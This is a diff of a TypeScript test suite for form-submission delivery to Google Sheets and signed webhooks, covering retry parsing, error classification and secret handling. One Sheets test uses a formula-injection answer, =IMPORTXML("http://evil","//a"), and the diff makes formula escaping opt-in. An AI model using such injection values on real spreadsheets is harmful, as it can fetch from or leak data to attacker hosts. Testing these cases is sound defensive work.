@@ -96,12 +96,21 @@ const headersOf = (call: Call) => new Headers(call.init.headers as ConstructorPa
 // ── Results and classification ─────────────────────────────────────────────
 
 describe("retry classification", () => {
-  it("reads Retry-After as seconds or an HTTP date, capped at a day", () => {
+  it("reads Retry-After as delta-seconds or an IMF-fixdate, at least 1 s and at most a day", () => {
     expect(retryAfterSeconds("30")).toBe(30);
+    expect(retryAfterSeconds(" 30 ")).toBe(30);
     expect(retryAfterSeconds(new Date(1_000_000 + 90_000).toUTCString(), 60, 1_000_000)).toBe(90);
     expect(retryAfterSeconds("nonsense", 7)).toBe(7);
     expect(retryAfterSeconds(null)).toBe(60);
     expect(retryAfterSeconds("999999999")).toBe(86_400);
+    expect(retryAfterSeconds("9".repeat(400))).toBe(86_400);
+    // A floor of 1 s: "now" or a date already past never means "retry in a tight loop".
+    expect(retryAfterSeconds("0")).toBe(1);
+    expect(retryAfterSeconds(new Date(1_000_000 - 90_000).toUTCString(), 60, 1_000_000)).toBe(1);
+    // Junk that Date.parse would read is not a Retry-After.
+    for (const junk of ["-5", "1.5", "+5", "5s", "2026-10-22", "Oct 22 2026", "Thu, 22 Oct 2026 07:28:00 +0000", "1e3"]) {
+      expect(retryAfterSeconds(junk, 7), junk).toBe(7);
+    }
   });
 
   it("retries 408, 425, 429 and 5xx; not other statuses", () => {
@@ -119,10 +128,11 @@ describe("retry classification", () => {
   it("reduces unknown errors to their kind, never their message", () => {
     const timeout = Object.assign(new Error("https://hook.example/?token=SECRET"), { name: "TimeoutError" });
     expect(deliveryFailure(timeout)).toEqual({ ok: false, retryable: true, error: "Timed out" });
-    expect(deliveryFailure(new TypeError("fetch failed https://x/?k=SECRET"))).toEqual({
+    // A TypeError outside fetch is a bug: retrying would repeat it forever.
+    expect(deliveryFailure(new TypeError("x is undefined https://x/?k=SECRET"))).toEqual({
       ok: false,
-      retryable: true,
-      error: "Network error",
+      retryable: false,
+      error: "Unexpected error",
     });
     expect(deliveryFailure(new Error("boom SECRET")).error).toBe("Unexpected error");
     expect(deliveryFailure(new DeliveryError("Bad config", { status: 400 }))).toEqual({
@@ -441,9 +451,9 @@ describe("sheet helpers", () => {
     expect(mergeHeader(["id", "", ""], ["x"])).toEqual(["id", "x"]);
   });
 
-  it("maps rows onto the header, escaping formulas", () => {
-    expect(rowFor(["id", "a", "b"], { id: "r", b: "=1+1" })).toEqual(["r", "", "'=1+1"]);
-    expect(rowFor(["id", "b"], { id: "r", b: "=1+1" }, false)).toEqual(["r", "=1+1"]);
+  it("maps rows onto the header, escaping formulas only when asked", () => {
+    expect(rowFor(["id", "a", "b"], { id: "r", b: "=1+1" })).toEqual(["r", "", "=1+1"]);
+    expect(rowFor(["id", "b"], { id: "r", b: "=1+1" }, true)).toEqual(["r", "'=1+1"]);
     expect(columnLetter(0)).toBe("A");
     expect(columnLetter(25)).toBe("Z");
     expect(columnLetter(26)).toBe("AA");
@@ -494,9 +504,10 @@ describe("sheetsDestination", () => {
     return { ...mock, appended, header: () => header };
   }
 
-  it("creates the tab and header, then appends one RAW row with formulas escaped", async () => {
+  it("creates the tab and header, then appends one RAW row with text stored as typed", async () => {
     const google = fakeGoogle();
     const sheet = sheetsDestination({ account, fetch: google.fetch });
+    // RAW never runs a formula, so nothing is prefixed: a "'" would be stored literally.
     const evil = { ...submission, answers: { ...submission.answers, improve: "=IMPORTXML(\"http://evil\",\"//a\")" } };
     const result = await sheet.deliver(evil, def, config);
     expect(result.ok).toBe(true);
@@ -508,7 +519,7 @@ describe("sheetsDestination", () => {
       "06:00",
       4,
       "Coaching, The workout",
-      "'=IMPORTXML(\"http://evil\",\"//a\")",
+      "=IMPORTXML(\"http://evil\",\"//a\")",
       "Yes",
       "ada@example.com",
       "123-45-6789",
@@ -522,6 +533,25 @@ describe("sheetsDestination", () => {
     expect(token.body).not.toContain("PRIVATE");
     if (!result.ok) return;
     expect(result.state).toMatchObject({ spreadsheet_id: "sheet_ABCDEFGHIJ", sheet_name: "Responses", sheet_id: 7, last_row: 2 });
+  });
+
+  it("prefixes formula-like text and header keys with ' only when escapeFormulas is on", async () => {
+    const withAt = defineForm({
+      id: "at",
+      title: "At",
+      blocks: [f.longText("@note", { label: "Note" }), f.longText("plain", { label: "Plain" })],
+    }).definition;
+    const answers = { "@note": "@coach thanks", plain: "=1+1" };
+    const plain = fakeGoogle();
+    await sheetsDestination({ account, fetch: plain.fetch }).deliver({ id: "r", answers }, withAt, config);
+    expect(plain.header()).toEqual(["id", "@note", "plain"]);
+    expect(plain.appended[0]).toEqual(["r", "@coach thanks", "=1+1"]);
+
+    clearGoogleTokenCache();
+    const escaped = fakeGoogle();
+    await sheetsDestination({ account, fetch: escaped.fetch, escapeFormulas: true }).deliver({ id: "r", answers }, withAt, config);
+    expect(escaped.header()).toEqual(["id", "'@note", "plain"]);
+    expect(escaped.appended[0]).toEqual(["r", "'@coach thanks", "'=1+1"]);
   });
 
   it("makes one request (the append) once the state is cached, and reuses the token", async () => {
@@ -643,7 +673,7 @@ describe("sheetsDestination", () => {
 // ── Webhook ────────────────────────────────────────────────────────────────
 
 describe("webhookDestination", () => {
-  const secret = "a-webhook-signing-secret";
+  const secret = "whsec_YS13ZWJob29rLXNpZ25pbmctc2VjcmV0IQ==";
   const now = () => 1_800_000_000_000;
 
   it("posts a Standard Webhooks request that verifies", async () => {
@@ -660,7 +690,7 @@ describe("webhookDestination", () => {
     expect(await verifyWebhook({ secret, headers, body: call.body, now })).toBe(true);
     // Tampered, wrong secret, stale.
     expect(await verifyWebhook({ secret, headers, body: call.body.replace("resp-1", "resp-2"), now })).toBe(false);
-    expect(await verifyWebhook({ secret: "another-secret-entirely", headers, body: call.body, now })).toBe(false);
+    expect(await verifyWebhook({ secret: "whsec_YW5vdGhlci1zZWNyZXQtZW50aXJlbHkh", headers, body: call.body, now })).toBe(false);
     expect(await verifyWebhook({ secret, headers, body: call.body, now: () => now() + 301_000 })).toBe(false);
 
     const payload = JSON.parse(call.body) as { type: string; data: { submission: { answers: Record<string, unknown> }; row: Record<string, unknown> } };
@@ -678,6 +708,20 @@ describe("webhookDestination", () => {
       '{"test": 2432232314}',
     );
     expect(signature).toBe("v1,g0hM9SsE+OTPJTGt/tmIKtSyZlE3uFJELVlNIOLJ1OE=");
+  });
+
+  it("base64-decodes the secret with or without whsec_, as the reference libraries do", async () => {
+    const args = ["msg_p5jXN8AQM9LWM0D4loKWxJek", 1614265330, '{"test": 2432232314}'] as const;
+    expect(await signWebhook("MfKQ9r8GKYqrTwjUPD8ILPZIo2LaLaSw", ...args)).toBe("v1,g0hM9SsE+OTPJTGt/tmIKtSyZlE3uFJELVlNIOLJ1OE=");
+    // Not base64 (a raw passphrase, base64url, missing padding): refused, never used as UTF-8.
+    for (const bad of ["a-webhook-signing-secret", "whsec_", "whsec_YS13ZWJob29rLXNpZ25pbmctc2VjcmV0IQ", "whsec_a-b_c-d_e-f_g-h_i-j_k-l_"]) {
+      await expect(signWebhook(bad, ...args), bad).rejects.toThrow("The webhook secret must be base64");
+    }
+    const mock = mockFetch(() => new Response(null, { status: 204 }));
+    expect(
+      await webhookDestination({ secret: "a raw passphrase!", fetch: mock.fetch }).deliver(submission, def, { url: "https://h.example.com" }),
+    ).toMatchObject({ ok: false, retryable: false, error: expect.stringContaining("must be base64") });
+    expect(mock.calls).toEqual([]);
   });
 
   it("accepts any of several signatures (secret rotation)", async () => {
@@ -711,7 +755,7 @@ describe("webhookDestination", () => {
       if (!result.ok && url) expect(result.error).not.toContain(url);
     }
     expect(mock.calls).toEqual([]);
-    expect(await webhookDestination({ secret: "short", fetch: mock.fetch }).deliver(submission, def, { url: "https://h.example.com" })).toMatchObject({
+    expect(await webhookDestination({ secret: "whsec_c2hvcnQ=", fetch: mock.fetch }).deliver(submission, def, { url: "https://h.example.com" })).toMatchObject({
       ok: false,
       retryable: false,
       error: "The webhook secret is shorter than 16 bytes",
@@ -730,6 +774,30 @@ describe("webhookDestination", () => {
     expect(await answer(503)).toMatchObject({ ok: false, retryable: true, status: 503 });
     expect(await answer(410)).toMatchObject({ ok: false, retryable: false, status: 410 });
     expect(await answer(302)).toMatchObject({ ok: false, retryable: false, error: "Webhook answered 302: redirects are not followed" });
+  });
+
+  it("fails permanently, without its message, when the secret resolver throws", async () => {
+    const mock = mockFetch(() => new Response(null, { status: 200 }));
+    const throwing = webhookDestination({
+      secret: () => {
+        throw new Error("vault said token=SECRET");
+      },
+      fetch: mock.fetch,
+    });
+    expect(await throwing.deliver(submission, def, { url: "https://hooks.example.com" })).toEqual({
+      ok: false,
+      retryable: false,
+      error: "The webhook secret could not be resolved",
+    });
+    // A resolver may still ask for a retry with a retryable DeliveryError.
+    const busy = webhookDestination({
+      secret: async () => {
+        throw new DeliveryError("Vault busy", { retryable: true, retryAfterSeconds: 5 });
+      },
+      fetch: mock.fetch,
+    });
+    expect(await busy.deliver(submission, def, { url: "https://hooks.example.com" })).toMatchObject({ ok: false, retryable: true, error: "Vault busy" });
+    expect(mock.calls).toEqual([]);
   });
 
   it("leaves identifying answers out on an anonymous form, and finds the secret per config", async () => {
